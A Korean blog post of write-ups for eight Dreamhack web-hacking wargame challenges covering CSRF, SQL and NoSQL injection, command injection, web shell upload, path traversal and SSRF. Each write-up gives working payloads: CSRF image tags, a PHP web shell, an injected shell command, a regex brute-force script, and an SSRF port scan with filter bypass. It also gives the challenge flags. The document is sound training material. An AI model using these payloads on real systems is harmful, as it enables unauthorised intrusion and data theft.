--- meta
title: Dreamhack Wargames | Web Hacking II
date: 2025/10/11
excerpt: Dreamhack Wargames 풀이 II
categories: Dreamhack, 워게임
---

### csrf-1

#### Description

![Description](/data/Dreamhack%20Wargames%20|%20Web%20Hacking%20II/1.png)

---

#### Write-Up

제공된 웹 사이트에 접속하면 메인 페이지를 제외하고 총 4개의 페이지가 존재함을 알 수 있다.

![Write-Up](/data/Dreamhack%20Wargames%20|%20Web%20Hacking%20II/2.png)

첨부 파일을 다운로드한 뒤 소스 코드를 확인하며 각 페이지가 수행하는 기능을 파악해 보았다.

![Write-Up](/data/Dreamhack%20Wargames%20|%20Web%20Hacking%20II/3.png)
![Write-Up](/data/Dreamhack%20Wargames%20|%20Web%20Hacking%20II/4.png)

`/vuln` 엔드포인트는 CSRF 취약점이 존재하는 페이지로 `param` 파라미터로 전달받은 값을 출력한다. 내부에 XSS 공격을 방지하기 위한 필터링 로직이 구현되어 있어, 파라미터 값에 `frame`, `script`, `on` 문자열이 포함된 경우 이를 `*`로 치환하도록 되어 있다. 링크를 클릭하여 해당 페이지로 이동하면 기본적으로 `param=<script>alert(1)</script>`의 값이 설정되어 있는데, `script` 문자열이 `*`로 치환되어 스크립트는 실행되지 않는 것을 확인할 수 있다.

![Write-Up](/data/Dreamhack%20Wargames%20|%20Web%20Hacking%20II/5.png)
![Write-Up](/data/Dreamhack%20Wargames%20|%20Web%20Hacking%20II/6.png)

`/memo` 엔드포인트는 `memo` 파라미터로 전달받은 값을 `memo_text`에 추가한 뒤 화면에 출력하는 페이지이다. 링크를 클릭하여 해당 페이지로 이동하면 기본적으로 `memo=hello`의 값이 설정되어 있어, `hello` 문자열이 출력되는 것을 확인할 수 있다.

![Write-Up](/data/Dreamhack%20Wargames%20|%20Web%20Hacking%20II/7.png)
![Write-Up](/data/Dreamhack%20Wargames%20|%20Web%20Hacking%20II/8.png)

`/admin/notice_flag` 엔드포인트는 플래그 값을 `/memo`에 출력하는 기능을 수행한다. 다만, 플래그를 출력하기 위해서는 두 가지 조건을 모두 충족해야 한다.

첫째, 해당 페이지에 대한 접속 요청의 출발지 IP가 로컬 호스트(`127.0.0.1`)이어야 한다.  
둘째, 요청에 포함된 파라미터 중 `userid`의 값이 `admin`이어야 한다.

현재는 외부에서 직접 접속한 상태이므로 첫째 조건을 충족하지 못해 `Access Denied`가 출력되고 있다.

![Write-Up](/data/Dreamhack%20Wargames%20|%20Web%20Hacking%20II/9.png)
![Write-Up](/data/Dreamhack%20Wargames%20|%20Web%20Hacking%20II/10.png)

`/flag` 엔드포인트는 입력받은 URL을 확인하는 봇이 구현된 페이지이다.  
`read_url()` 함수는 `url`과 `cookie` 값을 매개변수로 받는 함수이다. `driver.add_cookie(cookie)`, `driver.get(url)`와 같은 코드를 고려하면, 이 함수는 전달된 `cookie` 데이터를 쿠키에 저장하고 `url` 파라미터로 지정된 주소에 접속하는 동작을 수행함을 유추할 수 있다.  
`flag()` 함수는 내부에서 `check_csrf()` 함수를 통해 `read_url()`을 호출하며, 이 과정에서 봇은 사용자가 입력한 `param` 값을 포함한 채 로컬 호스트의 `/vuln` 엔드포인트에 접속하게 된다. 이때 봇이 `userid=admin` 파라미터를 포함한 상태로 `/admin/notice_flag`에 접속하도록 유도하면 플래그를 획득할 수 있다.

CSRF 공격을 통해 위조된 요청을 전송하기 위해, `param` 파라미터에 다음 페이로드를 작성하였다.

```html
<img src="/admin/notice_flag?userid=admin">
```

![Write-Up](/data/Dreamhack%20Wargames%20|%20Web%20Hacking%20II/11.png)
![Write-Up](/data/Dreamhack%20Wargames%20|%20Web%20Hacking%20II/12.png)

해당 스크립트를 입력한 후 `/memo` 엔드포인트에서 플래그가 출력되는 것을 확인하였다.

<p style="text-align: center;">Flag: <span style="color: green">DH{<span style="filter: blur(5px); overflow-wrap:anywhere;">11a230801ad0b80d52b996cbe203e83d</span>}</span></p>

<br>
<br>
<br>

### csrf-2

#### Description

![Description](/data/Dreamhack%20Wargames%20|%20Web%20Hacking%20II/1.png)

---

#### Write-Up

제공된 웹 사이트에 접속하면 다음과 같은 페이지가 나타난다.

![Write-Up](/data/Dreamhack%20Wargames%20|%20Web%20Hacking%20II/13.png)

csrf-1과 비교하면, `/memo`와 `/admin/notice_flag` 대신 `/login` 페이지가 존재함을 알 수 있다.

![Write-Up](/data/Dreamhack%20Wargames%20|%20Web%20Hacking%20II/14.png)

`/login` 엔드포인트는 일반적인 로그인 페이지에 해당한다. 계정 정보와 로그인 로직 등을 파악하기 위해 소스 코드를 확인해 보았다.

![Write-Up](/data/Dreamhack%20Wargames%20|%20Web%20Hacking%20II/15.png)

로그인과 관련된 코드는 위와 같다. 로그인 로직은 일반적인 세션 기반 방식으로 구현되어 있으며, 특징적인 점으로 `/change_password` 엔드포인트가 존재하여 비밀번호 변경 기능을 제공한다. 또한, admin 계정으로 로그인하면 메인 페이지에 플래그가 출력된다는 사실을 확인할 수 있다.

이어서 `/flag` 엔드포인트에서 실행되는 코드를 확인해 보자.

![Write-Up](/data/Dreamhack%20Wargames%20|%20Web%20Hacking%20II/16.png)

csrf-1과 거의 동일한 기능을 수행하는데, 한 가지 차이점은 봇이 `/vuln` 엔드포인트에 접근할 때 admin 계정의 세션 ID를 발급받아 이를 쿠키에 저장한 상태로 방문한다는 점이다.

`/change_password` 엔드포인트는 쿠키에 저장된 `sessionid` 값을 기반으로 로그인된 계정을 판별하기 때문에, 봇을 해당 페이지에 접속시키면 admin 계정이 비밀번호 변경 요청을 보낸 것처럼 위조할 수 있다. 이후 비밀번호를 변경한 뒤, 해당 비밀번호를 사용해 admin 계정으로 로그인하면 플래그를 획득할 수 있다.

CSRF 공격을 통해 위조된 요청을 전송하기 위해, `param` 파라미터에 다음 페이로드를 작성하였다.

```html
<img src="/change_password?pw=admin">
```

![Write-Up](/data/Dreamhack%20Wargames%20|%20Web%20Hacking%20II/17.png)

봇이 `/vuln` 엔드포인트에 접속하며 `/change_password`로 요청을 보내 admin 계정의 비밀번호를 `admin`으로 변경하였으므로, 로그인 페이지에서 `admin`/`admin`을 입력하면 로그인에 성공할 것으로 예상된다.

![Write-Up](/data/Dreamhack%20Wargames%20|%20Web%20Hacking%20II/18.png)

admin 계정으로 로그인에 성공하여 플래그가 출력되었다.

<p style="text-align: center;">Flag: <span style="color: green">DH{<span style="filter: blur(5px); overflow-wrap:anywhere;">c57d0dc12bb9ff023faf9a0e2b49e470a77271ef</span>}</span></p>

<br>
<br>
<br>

### simple_sqli

#### Description

![Description](/data/Dreamhack%20Wargames%20|%20Web%20Hacking%20II/19.png)

---

#### Write-Up

제공된 웹 사이트에 접속하면 다음과 같은 로그인 페이지가 존재한다.

![Write-Up](/data/Dreamhack%20Wargames%20|%20Web%20Hacking%20II/20.png)

로그인 로직을 파악하기 위해 소스 코드를 확인해 보았다.

![Write-Up](/data/Dreamhack%20Wargames%20|%20Web%20Hacking%20II/21.png)

로그인 처리는 데이터베이스에 SQL 쿼리를 실행하여 `userid`와 `userpassword`가 일치하는 레코드를 조회하는 방식으로 이루어진다. 이때 `userid` 값이 `admin`인 경우 플래그가 출력되는 것을 확인할 수 있다.

실행되는 쿼리를 자세히 살펴보면, 사용자가 입력한 값을 별도의 검증이나 필터링 없이 쿼리 문자열에 그대로 포함시키는 것을 확인할 수 있다. 이러한 구조에서는 SQL Injection 공격이 가능하다. 예를 들어, `userid`에 `admin" -- `를 입력할 경우 다음과 같은 형태의 쿼리가 구성된다.

```sql
select * from users where userid="admin" -- " and userpassword="any"
```

해당 쿼리가 실행되면 `--` 이후의 구문은 모두 주석으로 처리되므로, 비밀번호 검증 조건은 사용되지 않게 된다. 그 결과 비밀번호에 어떠한 값을 입력하더라도 `userid`가 `admin`인 레코드가 조회된다. 즉, 현재 admin 계정의 실제 비밀번호를 알지 못하더라도 admin 계정으로 로그인할 수 있게 된다.

이에 따라 `admin" -- `/`any`를 입력한 뒤 로그인을 시도하였다.

![Write-Up](/data/Dreamhack%20Wargames%20|%20Web%20Hacking%20II/22.png)
![Write-Up](/data/Dreamhack%20Wargames%20|%20Web%20Hacking%20II/23.png)

admin 계정으로 로그인에 성공하여 플래그가 출력되었다.

<p style="text-align: center;">Flag: <span style="color: green">DH{<span style="filter: blur(5px); overflow-wrap:anywhere;">c1126c8d35d8deaa39c5dd6fc8855ed0</span>}</span></p>

<br>
<br>
<br>

### Mango

#### Description

![Description](/data/Dreamhack%20Wargames%20|%20Web%20Hacking%20II/24.png)

---

#### Write-Up

제공된 웹 사이트에 접속하면 다음과 같은 페이지가 나타난다.

![Write-Up](/data/Dreamhack%20Wargames%20|%20Web%20Hacking%20II/25.png)

화면에 출력되는 `/login?uid=guest&upw=guest`라는 주소로 이동해 보았다.

![Write-Up](/data/Dreamhack%20Wargames%20|%20Web%20Hacking%20II/26.png)

`guest` 문자열이 출력된다. `uid`와 `upw` 파라미터에 계정 정보를 전달하면 로그인을 수행한 뒤 로그인된 계정을 출력하는 구조로 추측된다. 구체적인 처리 과정을 파악하기 위해 소스 코드를 확인해 보았다.

![Write-Up](/data/Dreamhack%20Wargames%20|%20Web%20Hacking%20II/27.png)

코드를 살펴보면, `req.query`의 타입이 문자열로 지정되어 있지 않기 때문에 문자열 외의 자료형이 입력될 수 있다. 그렇다면 객체 형태의 자료형, 즉 연산자가 사용 가능하며 이를 통해 NoSQL Injection 공격을 수행할 수 있다. 이를테면 다음 쿼리 스트링을 입력해 보자.

```js
// Query String:
uid=guest&upw[$regex]=^g

// MongoDB Query:
db.collection('user').findOne({
  'uid': "guest",
  'upw': { $regex: "^g" },
})
```

![Write-Up](/data/Dreamhack%20Wargames%20|%20Web%20Hacking%20II/28.png)

`$regex` 연산자를 활용하여 `uid`가 `guest`이고 `upw`가 `g`로 시작하는 데이터를 조회하고 로그인에 성공하였다.  
같은 방식을 사용해 admin 계정으로 로그인을 시도할 수 있으나, 필터링 조건에 의해 `admin`, `dh`, `admi` 문자열을 쿼리 내에 사용할 수 없다. 이를 우회하기 위해서는 다음과 같은 쿼리 스트링을 사용할 수 있다.

```js
// Query String:
uid[$regex]=^adm&upw[$regex]=^..{

// MongoDB Query:
db.collection('user').findOne({
  'uid': { $regex: "^adm" },
  'upw': { $regex: "^..{" },
})
```

해당 쿼리를 통해 조회되는 데이터는 `uid`가 `adm`으로 시작하고 `upw`가 2개의 문자와 `{`로 시작하는 계정이다. `dh` 문자열을 사용할 수 없으므로 정규식에서 모든 문자를 나타내는 메타 문자인 `.`을 대신 사용하였다.

![Write-Up](/data/Dreamhack%20Wargames%20|%20Web%20Hacking%20II/29.png)

성공적으로 `admin`이 출력되는 것을 확인하였다. 이후 `upw`의 정규식 패턴 뒤에 임의 문자를 하나씩 추가해 가며 정확한 문자열을 순차적으로 찾을 수 있다. 이를 수행하기 위해 다음과 같은 Python 스크립트를 작성하였다.

<pre><code class="language-python hljs" data-highlighted="yes"><span class="hljs-comment"># mango.py</span>

<span class="hljs-keyword">import</span> requests

alphanumeric = <span class="hljs-string">"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>
url = <span class="hljs-string">"http://host1.dreamhack.games:14943/login"</span>
query = <span class="hljs-string">"?uid[$regex]=^adm&amp;upw[$regex]=^..{"</span>
str = <span class="hljs-string">""</span>

<span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):
  <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> alphanumeric:
    res = requests.get(url + query + str + char)
    <span class="hljs-keyword">if</span> <span class="hljs-string">"admin"</span> <span class="hljs-keyword">in</span> res.text:
      str += char
      <span class="hljs-keyword">break</span>

<span class="hljs-built_in">print</span>(<span class="hljs-string">"flag: DH{" + str + "}"</span>)
</code></pre>

![Write-Up](/data/Dreamhack%20Wargames%20|%20Web%20Hacking%20II/30.png)

해당 스크립트를 실행하면 플래그가 출력된다.

<p style="text-align: center;">Flag: <span style="color: green">DH{<span style="filter: blur(5px); overflow-wrap:anywhere;">89e50fa6fafe2604e33c0ba05843d3df</span>}</span></p>

<br>
<br>
<br>

### command-injection-1

#### Description

![Description](/data/Dreamhack%20Wargames%20|%20Web%20Hacking%20II/31.png)

---

#### Write-Up

제공된 웹 사이트에 접속하면 다음과 같이 특정 호스트로 패킷을 보낼 수 있는 기능이 존재한다.

![Write-Up](/data/Dreamhack%20Wargames%20|%20Web%20Hacking%20II/32.png)

`8.8.8.8`을 입력하고 `Ping!` 버튼을 클릭하면 결과를 확인할 수 있다.

![Write-Up](/data/Dreamhack%20Wargames%20|%20Web%20Hacking%20II/33.png)

Command Injection을 통해 플래그를 획득하는 문제이므로, 우선 소스 코드를 다운로드하여 해당 페이지의 동작을 확인해 보았다.

![Write-Up](/data/Dreamhack%20Wargames%20|%20Web%20Hacking%20II/34.png)

`/ping` 엔드포인트에서 호출되는 `ping()` 함수를 살펴보면, 사용자로부터 IP 주소 값을 입력받아 `ping -c 3 "..."` 형태의 명령어를 셸에서 실행한 뒤 그 결과를 반환하는 구조임을 확인할 수 있다. 이 과정에서 사용자 입력값에 대한 어떠한 검증도 수행하지 않으므로, 악의적인 입력을 통한 Command Injection 공격이 가능하다.

플래그는 `flag.py`에 존재하므로, 해당 파일의 내용을 읽기 위해 다음 페이로드를 입력하였다.

<pre><code class="language-bash hljs" data-highlighted="yes"><span class="hljs-comment"># host</span>
8.8.8.8"; cat "flag.py

<span class="hljs-comment"># cmd</span>
<span class="hljs-built_in">ping</span> -c 3 <span class="hljs-string">"8.8.8.8"</span>; <span class="hljs-built_in">cat</span> <span class="hljs-string">"flag.py"</span>
</code></pre>

페이로드 입력 후 `Ping!` 버튼을 클릭하면 다음과 같은 경고문이 출력된다.

![Write-Up](/data/Dreamhack%20Wargames%20|%20Web%20Hacking%20II/35.png)

개발자 도구로 해당 입력란을 확인해 보면, `pattern` 속성을 통해 특정 정규식과 일치하는 값만이 입력 가능하도록 설정되어 있음을 알 수 있다.

![Write-Up](/data/Dreamhack%20Wargames%20|%20Web%20Hacking%20II/36.png)

하지만 이 제약 조건은 서버에서 검증하는 것이 아니므로 실질적인 효과가 없다. 실제로 HTML 코드를 수정해 `pattern` 속성을 제거한 뒤 `Ping!` 버튼을 클릭하면 정상적으로 양식이 제출된다.

![Write-Up](/data/Dreamhack%20Wargames%20|%20Web%20Hacking%20II/37.png)
![Write-Up](/data/Dreamhack%20Wargames%20|%20Web%20Hacking%20II/38.png)

Command Injection을 통해 `cat "flag.py"` 명령이 수행되어 플래그가 출력되었다.

<p style="text-align: center;">Flag: <span style="color: green">DH{<span style="filter: blur(5px); overflow-wrap:anywhere;">pingpingppppppppping!!</span>}</span></p>

<br>
<br>
<br>

### image-storage

#### Description

![Description](/data/Dreamhack%20Wargames%20|%20Web%20Hacking%20II/39.png)

---

#### Write-Up

제공된 웹 사이트에 접속하면 다음과 같이 파일을 업로드할 수 있는 기능이 존재한다.

![Write-Up](/data/Dreamhack%20Wargames%20|%20Web%20Hacking%20II/40.png)

예시 이미지를 업로드하면 다음과 같이 `uploads` 디렉터리에 저장되었다는 메시지가 출력된다.

![Write-Up](/data/Dreamhack%20Wargames%20|%20Web%20Hacking%20II/41.png)
![Write-Up](/data/Dreamhack%20Wargames%20|%20Web%20Hacking%20II/42.png)

만약 사용자가 업로드한 파일이 서버에 그대로 저장되고 해당 파일이 실제 이미지인지의 여부를 검사하지 않는 경우, 웹 셸 파일을 업로드한 뒤 서버 상에서 임의의 시스템 명령을 실행할 수 있다.

따라서 다음과 같은 웹 셸 파일을 생성한 뒤 업로드가 가능한지 확인해 보았다.

```php
// webshell.php

<?php
  system($_GET['cmd']); 
?>
```

![Write-Up](/data/Dreamhack%20Wargames%20|%20Web%20Hacking%20II/43.png)
![Write-Up](/data/Dreamhack%20Wargames%20|%20Web%20Hacking%20II/44.png)

PHP 파일이 정상적으로 업로드되는 것을 확인하였다. 이후 웹 셸 파일이 저장된 경로로 접근한 뒤, `cmd` 파라미터에 임의의 명령어를 전달하면 서버에서 해당 시스템 명령을 실행할 수 있다.  
`/flag.txt`에 저장된 플래그를 확인하기 위해 `/uploads/webshell.php?cmd=cat%20/flag.txt` 경로로 요청을 전송하였으며, 이를 통해 해당 파일의 내용을 조회하였다.

![Write-Up](/data/Dreamhack%20Wargames%20|%20Web%20Hacking%20II/45.png)

성공적으로 플래그가 출력되었다.

<p style="text-align: center;">Flag: <span style="color: green">DH{<span style="filter: blur(5px); overflow-wrap:anywhere;">c29f44ea17b29d8b76001f32e8997bab</span>}</span></p>

<br>
<br>
<br>

### file-download-1

#### Description

![Description](/data/Dreamhack%20Wargames%20|%20Web%20Hacking%20II/46.png)

---

#### Write-Up

제공된 웹 사이트에 접속하면 다음과 같이 메모를 업로드할 수 있는 기능이 존재한다.

![Write-Up](/data/Dreamhack%20Wargames%20|%20Web%20Hacking%20II/47.png)

업로드한 메모 파일은 메인 페이지에서 확인 가능하며, 링크를 클릭하면 `/read` 엔드포인트를 통해 해당 메모의 내용을 조회할 수 있다.

![Write-Up](/data/Dreamhack%20Wargames%20|%20Web%20Hacking%20II/48.png)
![Write-Up](/data/Dreamhack%20Wargames%20|%20Web%20Hacking%20II/49.png)
![Write-Up](/data/Dreamhack%20Wargames%20|%20Web%20Hacking%20II/50.png)

File Download 취약점이 존재한다고 하였으므로 이를 검증하기 위해 소스 코드를 확인해 보았다.

![Write-Up](/data/Dreamhack%20Wargames%20|%20Web%20Hacking%20II/51.png)

`/read` 엔드포인트에서 호출되는 `read_memo()` 함수는 `name` 파라미터를 통해 파일명을 전달받아, `uploads` 디렉터리 내에서 해당 파일을 탐색한 후 파일의 내용을 반환한다. 이때 전달되는 파일명에 대해 어떠한 검증도 수행하지 않으므로 Path Traversal 공격을 수행할 수 있다.

`from flag import FLAG` 구문을 고려하면 플래그를 포함하는 `flag.py` 파일은 `app.py` 파일과 동일한 디렉터리에 위치하고, `uploads` 디렉터리는 `os.mkdir(UPLOAD_DIR)`를 통해 생성되므로 디렉터리 구조는 다음과 같이 구성된다.

```text
/
├── app.py
├── flag.py
└── uploads/
    └── test
```

`name` 파라미터에 `test`가 전달될 경우 `/uploads/test` 파일의 내용이 반환된다. 또한 `..` 메타 문자를 활용하면 `/uploads`의 상위 디렉터리에 위치한 `flag.py` 파일의 내용 역시 조회할 수 있다. `name` 파라미터에 `../flag.py`를 전달하여 이를 확인해 보자.

![Write-Up](/data/Dreamhack%20Wargames%20|%20Web%20Hacking%20II/52.png)

`flag.py`의 내용이 출력되어 플래그를 획득하였다.

<p style="text-align: center;">Flag: <span style="color: green">DH{<span style="filter: blur(5px); overflow-wrap:anywhere;">uploading_webshell_in_python_program_is_my_dream</span>}</span></p>

<br>
<br>
<br>

### web-ssrf

#### Description

![Description](/data/Dreamhack%20Wargames%20|%20Web%20Hacking%20II/53.png)

---

#### Write-Up

제공된 웹 사이트에 접속하면 다음과 같이 이미지를 열람할 수 있는 기능이 존재한다.

![Write-Up](/data/Dreamhack%20Wargames%20|%20Web%20Hacking%20II/54.png)

SSRF 취약점을 찾아내기 위해 첨부 파일을 다운로드한 뒤 소스 코드를 확인해 보았다.

![Write-Up](/data/Dreamhack%20Wargames%20|%20Web%20Hacking%20II/55.png)

`/img_viewer` 엔드포인트에서 호출되는 `img_viewer()` 함수는 기본적으로 입력으로 전달된 URL에 요청을 전송한 후, 해당 응답 데이터를 사용자에게 반환함으로써 화면에 이미지를 출력하는 구조로 동작한다. 이때 입력값이 `/`로 시작하는 경우, 요청은 `localhost:8000`, 즉 본 애플리케이션 자체로 전달된다.

플래그의 경로가 `./flag.txt`로 제시되어 있으므로, 우선 `/flag.txt`를 입력하고 결과를 확인해 보았다.

![Write-Up](/data/Dreamhack%20Wargames%20|%20Web%20Hacking%20II/56.png)
![Write-Up](/data/Dreamhack%20Wargames%20|%20Web%20Hacking%20II/57.png)

요청 결과는 404 Not Found로 확인되었으며, 이는 반환된 자원이 존재하지 않음을 의미한다. `flag.txt` 파일이 실제로 존재함에도 불구하고 해당 URL을 통해 접근할 수 없는 원인을 알아본 결과, 이는 Flask 프레임워크의 동작 특성에 기인한 것으로 판단되었다.

> **전통적 웹 서버와 Flask의 URL 처리 비교**
>
> - 전통적인 웹 서버(Apache 등)에서는 URL 경로와 서버 파일 시스템의 경로가 1:1로 대응된다. 즉, 사용자가 요청한 URL에 해당하는 파일이 존재하면 서버가 이를 그대로 반환하고, 파일이 없으면 404 Not Found를 반환한다.
> - Flask 프레임워크 기반 애플리케이션에서는 URL 요청이 반드시 실제 파일과 일치할 필요가 없으며, 요청 경로는 애플리케이션 코드 내에서 **명시적으로 등록된 엔드포인트**와 연결되어 처리된다. 따라서 Flask에서는 서버 파일 시스템에 파일이 존재하더라도, 해당 경로가 요청 처리 경로로 정의되어 있지 않으면 접근이 불가능하다.
> - Flask에서 정적 파일을 제공할 때에는 기본적으로 `static` 디렉터리 하위 경로에 한정하여 접근을 허용하며, 그 외 경로의 파일은 별도의 설정이 없는 한 외부에 노출되지 않는다. 이는 Flask가 동적 애플리케이션 처리 중심으로 설계되었기 때문에, 정적 파일 제공은 특별히 지정된 위치에서만 이루어지도록 제한된 동작이다.

예시 이미지 `/static/dream.jpg`는 `static` 디렉터리 하위에 존재하여 정상적으로 반환되었으나, `flag.txt`는 해당 파일을 반환하는 엔드포인트가 애플리케이션 코드 내에 정의되어 있지 않아 내용 확인이 불가능하였다. 즉, 현재 실행 중인 애플리케이션(`localhost:8000`)에 직접 요청을 보내는 방식으로는 플래그를 획득할 수 없다.

다만 소스 코드 하단을 살펴보면 다른 접근 방법에 대한 단서를 확인할 수 있는데, 이는 애플리케이션 실행 시 1500 ~ 1800번 포트 범위 내에서 별도의 로컬 서버가 동시에 구동되도록 설계되어 있다는 점이다.

![Write-Up](/data/Dreamhack%20Wargames%20|%20Web%20Hacking%20II/58.png)

해당 로컬 서버에는 `SimpleHTTPRequestHandler`가 핸들러로 설정되어 있으며, 이는 요청 경로에 대응하는 파일의 내용을 단순히 반환하는 동작을 수행한다고 명시되어 있다. 따라서 이 로컬 서버에 `/flag.txt` 경로로 요청을 전송하면 플래그 파일의 내용이 직접 응답으로 제공될 것으로 판단된다.

이제 정확히 어떤 포트에서 서버가 구동 중인지 파악하면 플래그를 획득할 수 있다. 이를 확인하기 위해서는 서버의 로컬 호스트로 요청을 전송해야 하나, 소스 코드 상에서 `localhost` 및 `127.0.0.1` 문자열이 필터링 대상으로 지정되어 있다. 따라서 해당 필터링을 우회할 수 있는 방법을 검색해 보았다.

![Write-Up](/data/Dreamhack%20Wargames%20|%20Web%20Hacking%20II/59.png)

IP 주소는 일반적인 점 10진 표기법 외에도 다양한 형식으로 표현될 수 있다. 예를 들어, `127.0.0.1`은 16진수 표기법을 사용하여 `0x7f.0x00.0x00.0x01`과 같이 나타낼 수 있다.

지금까지 확인된 정보를 바탕으로, 로컬 서버의 포트 번호를 찾기 위해 다음과 같은 Python 스크립트를 작성하였다.

```python
import requests

res_content = ""

for port in range(1500, 1800):
  url = f"http://0x7f.0x00.0x00.0x01:{port}/flag.txt"
  res = requests.post("http://host3.dreamhack.games:13241/img_viewer", data={"url": url})
  if res_content:
    if res_content != res.text:
      print(f"port: {port}")
      break
  else:
    res_content = res.text
```

![Write-Up](/data/Dreamhack%20Wargames%20|%20Web%20Hacking%20II/60.png)

스크립트 실행 결과, 로컬 서버가 1748번 포트에서 실행되고 있음을 확인하였다. 이후 이미지 열람 서비스에 `http://0x7f.0x00.0x00.0x01:1748/flag.txt`를 입력하면 `flag.txt`의 내용을 직접 확인할 수 있다.

![Write-Up](/data/Dreamhack%20Wargames%20|%20Web%20Hacking%20II/61.png)
![Write-Up](/data/Dreamhack%20Wargames%20|%20Web%20Hacking%20II/62.png)
![Write-Up](/data/Dreamhack%20Wargames%20|%20Web%20Hacking%20II/63.png)

성공적으로 플래그를 획득하였다.

<p style="text-align: center;">Flag: <span style="color: green">DH{<span style="filter: blur(5px); overflow-wrap:anywhere;">43dd2189056475a7f3bd11456a17ad71</span>}</span></p>